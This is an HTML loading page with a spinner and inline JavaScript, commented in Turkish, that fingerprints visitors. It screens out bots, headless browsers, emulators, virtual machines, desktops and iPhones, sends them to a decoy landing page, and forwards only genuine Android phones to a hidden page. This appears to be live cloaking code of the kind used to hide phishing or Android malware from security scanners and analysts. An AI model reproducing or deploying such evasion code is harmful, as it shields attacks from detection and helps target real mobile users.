<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Yükleniyor...</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;}
body{background:#111;display:flex;align-items:center;justify-content:center;height:100vh;}
.sp{width:40px;height:40px;border:4px solid #333;border-top-color:#fff;border-radius:50%;animation:spin 0.8s linear infinite;}
@keyframes spin{to{transform:rotate(360deg);}}
</style>
</head>
<body>
<div class="sp"></div>
<script>
(function(){
    function redirect(url){ window.location.replace(url); }

    // 1. Touch kontrolü - gerçek Android cihazda touch olmalı
    var hasTouch = ('ontouchstart' in window) || (navigator.maxTouchPoints > 0);
    if(!hasTouch){ redirect('/landing.html'); return; }

    // 2. UA tekrar kontrol - JS tarafında da doğrula
    var ua = navigator.userAgent || '';
    var isAndroid = /android/i.test(ua);
    var isWindows = /windows/i.test(ua);
    var isMac = /macintosh|mac os x/i.test(ua);
    var isIOS = /iphone|ipad/i.test(ua);
    var isBot = /bot|crawler|spider|headless|phantom|selenium|webdriver|puppeteer|playwright/i.test(ua);

    if(!isAndroid || isWindows || isMac || isIOS || isBot){
        redirect('/landing.html'); return;
    }

    // 3. Ekran kontrolü - Android ekranı makul boyutta olmalı
    var w = screen.width || window.innerWidth;
    var h = screen.height || window.innerHeight;
    if(w > 1200 || h > 1200 || w < 200 || h < 300){
        redirect('/landing.html'); return;
    }

    // 4. WebGL kontrolü - headless'ta genelde yok veya sahte
    try {
        var canvas = document.createElement('canvas');
        var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if(!gl){ redirect('/landing.html'); return; }
        var renderer = gl.getParameter(gl.RENDERER) || '';
        var vendor = gl.getParameter(gl.VENDOR) || '';
        // Bilinen bot/emülatör renderer'ları
        var fakeRenderers = ['swiftshader','llvmpipe','virtualbox','vmware','microsoft basic','software rasterizer'];
        var isFake = fakeRenderers.some(function(r){ return renderer.toLowerCase().includes(r); });
        if(isFake){ redirect('/landing.html'); return; }
    } catch(e){ redirect('/landing.html'); return; }

    // 5. Dil kontrolü - Türkçe veya TR locale
    var lang = (navigator.language || navigator.userLanguage || '').toLowerCase();
    var langs = (navigator.languages || []).map(function(l){ return l.toLowerCase(); });
    var isTurkish = lang.startsWith('tr') || langs.some(function(l){ return l.startsWith('tr'); });
    // Dil kontrolü opsiyonel - Türkçe değilse yine de geç ama logla
    // Çok katı olmasın diye sadece uyar, engelleme

    // 6. Otomasyon API kontrolü
    if(navigator.webdriver === true){
        redirect('/landing.html'); return;
    }

    // 7. Platform kontrolü
    var platform = (navigator.platform || '').toLowerCase();
    if(platform.includes('win') || platform.includes('mac') || platform.includes('linux') && !platform.includes('arm')){
        redirect('/landing.html'); return;
    }

    // Tüm kontroller geçti → gerçek Android kullanıcı
    redirect('/ara.html');
})();
</script>
</body>
</html>
